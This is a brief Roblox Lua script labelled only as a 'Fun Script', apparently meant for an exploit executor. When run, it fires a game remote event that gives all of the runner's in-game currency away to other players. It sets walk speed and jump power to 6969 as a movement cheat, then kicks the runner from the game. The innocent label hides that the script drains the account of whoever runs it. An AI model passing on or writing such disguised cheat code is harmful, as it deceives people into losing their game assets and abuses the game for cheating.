-- Fun Script
local DonateMoney = function(money,plr)
    game:GetService("ReplicatedStorage").Events.MenuActionEvent:FireServer(2,tostring(money),plr)
end
local Players = game:GetService("Players")
local PlayersTab = Players:GetPlayers()
local Money = game:GetService("Players").LocalPlayer.PlayerData.Currency.Value / #PlayersTab
for _, plr in ipairs(PlayersTab) do
    DonateMoney(Money,plr.Name)
end
local hum = Players.LocalPlayer.Character.Humanoid
hum.Changed:Connect(function()
    hum.WalkSpeed = 6969
    hum.JumpPower = 6969
end)
hum.WalkSpeed = 6969
wait(5)
Players.LocalPlayer:Kick()
